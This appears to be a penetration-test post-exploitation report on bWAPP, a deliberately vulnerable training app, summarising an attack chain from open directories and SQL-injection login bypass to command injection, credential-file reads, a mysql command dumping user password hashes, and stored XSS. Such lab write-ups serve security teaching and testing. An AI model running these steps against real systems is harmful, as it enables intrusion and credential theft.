# Post-Exploitation Findings — bWAPP | 10.10.30.128 | 2026-03-13-001

## Access Method

OS Command Injection via /commandi.php (EXPLOIT #3) — shell execution as www-data.

## System Enumeration

### Host Identity
```
hostname:    770425fcb17d (Docker container)
OS:          Ubuntu 14.04.3 LTS (Trusty Tahr) [EOL April 2019]
Kernel:      Linux 6.8.0-100-generic x86_64 (host kernel)
User:        www-data (uid=33, gid=33)
Working Dir: /app (web root)
```

### Network State
```
Active listeners:
  0.0.0.0:3306   MySQL — exposed to all interfaces
  0.0.0.0:80     Apache HTTP
  127.0.0.11:46549 (Docker DNS)
```

### Web Application Root
- Location: /app/
- Permissions: drwxr-xr-x root:root
- Runs in Docker container (hostname = container ID 770425fcb17d)

### PHP Environment
```
PHP_UPLOAD_MAX_FILESIZE=10M
PHP_POST_MAX_SIZE=10M
APACHE_RUN_DIR=/var/run/apache2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Critical File Contents Retrieved

### /app/admin/settings.php
```php
$db_server = "localhost";
$db_username = "root";
$db_password = "";      // <-- EMPTY ROOT PASSWORD
$db_sqlite = "db/bwapp.sqlite";
$smtp_sender = "bwapp@mailinator.com";
```

### /app/config.inc.php
```php
include("admin/settings.php");
$server = $db_server;
$username = $db_username;
$password = $db_password;
$database = $db_name;
```

## Database Access via RCE

Using MySQL root with empty password via localhost:
```
mysql -u root --password='' -e 'SELECT login,password,email,admin FROM bWAPP.users;'
```

**Output:**
```
login       password                                    email                       admin
A.I.M.      6885858486f31043e5839c735d99457f045affd0   bwapp-aim@mailinator.com    1
bee         6885858486f31043e5839c735d99457f045affd0   bwapp-bee@mailinator.com    1
```

## /etc/passwd Contents (excerpt)
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

## Attack Chain Summary

```
1. Recon: Open /passwords/ directory → wp-config.bak (thor/Asgard) + heroes.xml
2. Recon: Open /db/ directory → bwapp.sqlite (users table: bee/bug, A.I.M./bug)
3. Auth: Login as admin A.I.M. using leaked credentials (bug)
4. SQLi: Bypass login on sqli_16.php using tautological injection → admin access
5. RCE: OS command injection on commandi.php → shell as www-data
6. PostEx: Read /app/admin/settings.php → MySQL root with no password
7. PostEx: Execute MySQL queries via RCE → full database dump
8. XSS: Inject persistent <script> into blog → session hijack vector for all users
```

## Privilege Escalation Notes

- www-data has read access to all /app files including config with DB root credentials
- MySQL root with no password accessible from localhost via RCE
- Ubuntu 14.04 (EOL) — likely vulnerable to local privilege escalation CVEs
  (e.g., CVE-2015-1328, CVE-2016-5195 "Dirty COW") — not tested per mission scope
- Docker environment limits lateral movement to container scope

## Impact Assessment

| Finding | Confidentiality | Integrity | Availability |
|---|---|---|---|
| Open directory listings | High | None | None |
| Admin credential exposure | Critical | High | None |
| SQLi auth bypass | Critical | High | None |
| OS command injection (RCE) | Critical | Critical | High |
| MySQL root no-password (via RCE) | Critical | Critical | High |
| Stored XSS session hijack | High | High | None |
